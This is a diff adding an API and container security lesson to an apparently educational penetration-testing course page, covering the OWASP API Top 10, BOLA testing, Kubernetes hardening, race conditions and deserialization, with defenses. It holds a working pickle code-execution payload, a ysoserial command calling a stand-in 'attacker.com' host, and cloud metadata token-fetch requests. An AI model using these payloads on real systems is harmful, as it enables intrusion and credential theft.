@@ -47,6 +47,7 @@
     <div class="sidebar__section">
       <div class="sidebar__heading">Defensive Security</div>
       <a href="#cloud-sec" class="sidebar__link">☁️ Cloud Security</a>
+      <a href="#api-container-sec" class="sidebar__link">🔌 API & Container Security</a>
       <a href="#soc" class="sidebar__link">🛡️ SOC & SIEM</a>
       <a href="#mitre" class="sidebar__link">🗂️ MITRE ATT&CK</a>
     </div>
@@ -1043,6 +1044,111 @@ curl -H "Metadata-Flavor: Google" \
 # Azure IMDS (Instance Metadata Service)
 curl -H Metadata:true \
   "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"</code></pre>
+      </div>
+    </section>
+
+    <!-- ===== API & CONTAINER SECURITY ===== -->
+    <section id="api-container-sec">
+      <h2>🔌 API &amp; Container Security</h2>
+      <div class="lesson-block">
+        <div class="lesson-block__header">
+          <div class="lesson-block__title">OWASP API Top 10, Container/K8s Attacks, Race Conditions, Deserialization</div>
+          <button class="btn btn--outline btn--sm" data-lesson="cybersecurity-vapt:api-container-sec">Mark Complete</button>
+        </div>
+
+        <h3>OWASP API Security Top 10 (2023)</h3>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>#</th><th>Risk</th><th>Example</th></tr></thead>
+            <tbody>
+              <tr><td>API1</td><td>Broken Object Level Authorization (BOLA)</td><td><code>GET /api/orders/1002</code> returns another user's order — no ownership check on the object ID</td></tr>
+              <tr><td>API2</td><td>Broken Authentication</td><td>Weak/no rate limiting on login API, API keys committed to a public repo</td></tr>
+              <tr><td>API3</td><td>Broken Object Property Level Authorization</td><td>Response/request includes fields a user shouldn't see or edit, e.g. <code>"role":"admin"</code> in a PATCH body</td></tr>
+              <tr><td>API4</td><td>Unrestricted Resource Consumption</td><td>No pagination limit or rate limit → one client exhausts server resources</td></tr>
+              <tr><td>API5</td><td>Broken Function Level Authorization</td><td>A regular user can call an admin-only endpoint because it's only hidden in the UI, not enforced server-side</td></tr>
+              <tr><td>API6</td><td>Unrestricted Access to Sensitive Business Flows</td><td>No bot/rate protection on a "buy ticket" API → scalping bots buy out inventory instantly</td></tr>
+              <tr><td>API7</td><td>Server Side Request Forgery</td><td>Same root cause as SSRF covered earlier — APIs that fetch a user-supplied URL</td></tr>
+              <tr><td>API8</td><td>Security Misconfiguration</td><td>Verbose error messages leaking stack traces, default API gateway config</td></tr>
+              <tr><td>API9</td><td>Improper Inventory Management</td><td>Old/undocumented API versions (<code>/v1/</code>) still live and unpatched</td></tr>
+              <tr><td>API10</td><td>Unsafe Consumption of APIs</td><td>Blindly trusting data pulled from a third-party API integration</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <h3>BOLA — Testing for It</h3>
+        <pre><code># Log in as User A, capture a request to their own resource
+GET /api/v1/invoices/4471
+Authorization: Bearer &lt;user-A-token&gt;
+
+# Replay the SAME request with the SAME token, but change only the ID
+GET /api/v1/invoices/4472          # someone else's invoice
+Authorization: Bearer &lt;user-A-token&gt;
+
+# If it returns 200 with User B's data instead of 403/404 → BOLA confirmed
+# Fix: every object-returning endpoint must verify the authenticated user
+# actually owns (or is authorized to view) that specific object ID server-side</code></pre>
+
+        <h3>Container &amp; Kubernetes Attack Surface</h3>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Attack</th><th>Root cause</th><th>Mitigation</th></tr></thead>
+            <tbody>
+              <tr><td>Container breakout</td><td>Container runs as root with excess kernel capabilities, escapes to the host</td><td>Run as non-root, drop capabilities, use a restricted <code>seccomp</code>/AppArmor profile</td></tr>
+              <tr><td>Exposed Docker socket</td><td><code>/var/run/docker.sock</code> mounted inside a container = full host control</td><td>Never mount the Docker socket into untrusted containers</td></tr>
+              <tr><td>Kubernetes API server exposure</td><td>Anonymous/weak RBAC on the API server, or exposed kubelet API (port 10250)</td><td>RBAC least-privilege, disable anonymous auth, network policies</td></tr>
+              <tr><td>Pod escape via hostPath/privileged</td><td>Pod spec sets <code>privileged: true</code> or mounts sensitive hostPath volumes</td><td>Pod Security Standards/Admission (restricted profile), OPA/Kyverno policies</td></tr>
+              <tr><td>Vulnerable base image</td><td>Outdated image with known CVEs shipped to production</td><td>Image scanning in CI (Trivy, Grype), minimal/distroless base images</td></tr>
+            </tbody>
+          </table>
+        </div>
+        <pre><code># Quick container security checks
+docker inspect &lt;container&gt; --format '{{.HostConfig.Privileged}}'   # is it privileged?
+docker inspect &lt;container&gt; --format '{{.HostConfig.Binds}}'        # check for sensitive mounts
+
+# Scan an image for known CVEs
+trivy image myapp:latest
+
+# Check a running pod's security context
+kubectl get pod mypod -o jsonpath='{.spec.containers[0].securityContext}'
+
+# Find pods running as root or privileged across the cluster
+kubectl get pods -A -o json | jq '.items[] | select(.spec.containers[].securityContext.privileged==true) | .metadata.name'</code></pre>
+
+        <h3>Race Conditions (TOCTOU)</h3>
+        <p>A Time-Of-Check to Time-Of-Use bug: the app checks a condition (e.g. "is the balance sufficient?"), but an attacker slips another request in <em>between</em> the check and the action, before the first request's effect is saved.</p>
+        <pre><code># Classic example: a coupon that should only be redeemable once
+# Vulnerable flow (no locking):
+#   1. Check: SELECT redeemed FROM coupons WHERE code='SAVE50'  → false
+#   2. Apply discount
+#   3. Update: SET redeemed=true WHERE code='SAVE50'
+
+# Attacker fires 50 identical redeem requests in parallel (e.g. via Burp Intruder,
+# "null payloads" attack type, or a simple concurrent script) — many land between
+# steps 1 and 3 before the flag is set, and the coupon gets redeemed 50 times.
+
+# Fix: atomic operations / row-level locking at the database level
+UPDATE coupons SET redeemed = true
+WHERE code = 'SAVE50' AND redeemed = false;   -- atomic check-and-set
+-- if 0 rows affected, it was already redeemed — reject the request</code></pre>
+
+        <h3>Insecure Deserialization</h3>
+        <p>When an application deserializes attacker-controlled data without validation, a crafted object can trigger arbitrary code execution, privilege escalation, or data tampering the moment it's reconstructed in memory.</p>
+        <pre><code># Python: never unpickle untrusted data — __reduce__ can execute arbitrary code
+import pickle, os
+class Exploit:
+    def __reduce__(self):
+        return (os.system, ('whoami',))      # runs the moment this is unpickled!
+
+payload = pickle.dumps(Exploit())
+# pickle.loads(payload)  # <- executes `whoami` on the victim machine
+
+# Java: look for Apache Commons Collections / Jackson gadget chains
+# ysoserial is the standard tool for generating deserialization payloads
+java -jar ysoserial.jar CommonsCollections6 'curl attacker.com/pwned' | base64
+
+# Defenses: never deserialize untrusted input with a native deserializer;
+# use safe formats (JSON with strict schema validation) instead, and if you
+# must deserialize, use an integrity check (signed/HMAC'd payload) first</code></pre>
       </div>
     </section>
 
